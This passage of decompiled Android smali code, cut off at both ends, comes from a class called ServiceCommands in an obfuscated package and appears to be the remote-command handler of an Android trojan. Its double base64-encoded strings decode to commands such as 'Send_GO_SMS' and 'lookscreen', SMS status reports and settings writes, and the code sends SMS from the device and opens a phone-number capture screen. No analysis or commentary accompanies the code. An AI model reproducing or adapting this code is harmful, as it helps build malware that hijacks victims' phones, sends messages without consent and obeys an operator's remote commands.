    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "Ykc5dmEzTmpjbVZsYmc9PQ=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const/16 v6, 0x8

    aget-object v2, v2, v6

    invoke-virtual {v3, v0, v5, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_626
    .catch Ljava/lang/Exception; {:try_start_57a .. :try_end_626} :catch_7a3

    goto/16 :goto_7a3

    :cond_628
    move-object/from16 v7, v19

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->void:Ljava/lang/String;

    const-string v3, "UVV4TVUwVlVWRWxPUjFOSFR3PT0="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_79e

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v5, "Tmc9PQ=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v9, v4}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v3, v5, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v3, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    :try_start_671
    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v6, "YldGa1pWTmxkSFJwYm1keg=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v5, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3
    :try_end_683
    .catch Ljava/lang/Exception; {:try_start_671 .. :try_end_683} :catch_684

    goto :goto_685

    :catch_684
    move-object v3, v7

    :goto_685
    const-string v5, "TVNBeUlETWdOQ0ExSURZZ055QTRJRGtnTVRBZ01URWdNVElnTVRNZw=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "TlNzPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_6b7

    const-string v6, "TlNBPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v9, "TlNzPQ=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v6, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_6b7
    const-string v6, "TmlzPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_6df

    const-string v6, "TmlBPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v9, "TmlzPQ=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v6, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_6df
    const-string v6, "TnlzPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_707

    const-string v6, "TnlBPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v9, "TnlzPQ=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v6, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_707
    const-string v6, "T0NzPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_72f

    const-string v6, "T0NBPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v9, "T0NzPQ=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v6, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_72f
    const-string v6, "T1NzPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_757

    const-string v6, "T1NBPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v9, "T1NzPQ=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v6, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_757
    const-string v6, "TVRBcg=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_77f

    const-string v3, "TVRBZw=="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v6, "TVRBcg=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v3, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    :cond_77f
    :try_start_77f
    iget-object v3, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "VTJWMGRHbHVaM05CYkd3PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v0, v6, v2}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v3, "YldGa1pWTmxkSFJwYm1keg=="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v0, v3, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_79d
    .catch Ljava/lang/Exception; {:try_start_77f .. :try_end_79d} :catch_7a3

    goto :goto_7a3

    :cond_79e
    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->void:Ljava/lang/String;

    invoke-virtual {v2, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    :catch_7a3
    :goto_7a3
    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->void:Ljava/lang/String;

    const-string v3, "T2pvPQ=="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    :goto_7b4
    array-length v5, v2

    if-ge v3, v5, :cond_1353

    aget-object v5, v2, v3

    const-string v6, "ZkhOMFlYSjBhVzVxUFE9PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_810

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v9, "Ym1GdFpRPT0="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v6, v9}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static/range {v20 .. v20}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_810

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v6, v2, v3

    const-string v9, "ZkhOMFlYSjBhVzVxUFE9PQ=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v10, "ZkdWdVpITjBZWEowYVc1cQ=="

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v5, v6, v9, v10}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v9, "Ykc5amExOXBibW89"

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v0, v9, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_810
    aget-object v5, v2, v3

    const-string v6, "VTJWdVpGOUhUMTlUVFZNPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    const-string v6, "ZkhSbGVIUTk="

    if-eqz v5, :cond_939

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v9, v2, v3

    const-string v10, "Zkc1MWJXSmxjajA9"

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v9, v10, v11}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aget-object v9, v2, v3

    const-string v10, "ZEdWNGREMD0="

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    :try_start_84e
    iget-object v10, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const/4 v11, 0x1

    aget-object v12, v9, v11

    invoke-virtual {v10, v0, v5, v12}, Lnaqsl/ebxcb/exu/int;->int(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v10, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v11, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-static/range {v17 .. v17}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v14, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v15, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v18, "ZkU5MWRHZHZhVzVuSUZOTlV3PT0="

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18
    :try_end_882
    .catch Ljava/lang/Exception; {:try_start_84e .. :try_end_882} :catch_8e4

    move-object/from16 v19, v6

    :try_start_884
    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v15, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v6, 0xa

    invoke-virtual {v15, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const-string v6, "VG5WdFltVnlPaUE9"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v15, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v5, 0xa

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const-string v5, "VkdWNGREb2c="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v5, 0x1

    aget-object v6, v9, v5

    invoke-virtual {v15, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/16 v5, 0xa

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const-string v5, "ZkE9PQ=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v14, v5}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v13, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v10, v11, v12, v5}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-virtual {v5, v6}, Lnaqsl/ebxcb/exu/int;->int(Landroid/content/Context;)V
    :try_end_8e3
    .catch Ljava/lang/Exception; {:try_start_884 .. :try_end_8e3} :catch_8e6

    goto :goto_93b

    :catch_8e4
    move-object/from16 v19, v6

    :catch_8e6
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-static/range {v17 .. v17}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v11, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, "ZkNoUGRYUm5iMmx1WnlCVFRWTXBJQT09"

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, "UlhKeWIzSWdjMlZ1WkdsdVp5QlRUVk1zSUcxaGVXSmxJSFJvWlhKbElHRnlaU0J1YnlCd1pYSnRhWE56YVc5dUlIUnZJSE5sYm1RaGZBPT0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v5, v6, v9, v10}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    goto :goto_93b

    :cond_939
    move-object/from16 v19, v6

    :goto_93b
    aget-object v5, v2, v3

    const-string v6, "Ym5sdFFtVlFjMGN3"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    const-string v6, "YzNSeQ=="

    const/high16 v9, 0x40000000    # 2.0f

    const/high16 v10, 0x10000000

    if-eqz v5, :cond_987

    new-instance v5, Landroid/content/Intent;

    const-class v11, Lnaqsl/ebxcb/exu/Activity/ActivityGetNumber;

    invoke-direct {v5, v0, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "TUE9PQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v11, v12}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v11, "WTNkalgzUmxlSFE9"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V

    :cond_987
    aget-object v5, v2, v3

    const-string v11, "UjJWMFUxZFRSMDg9"

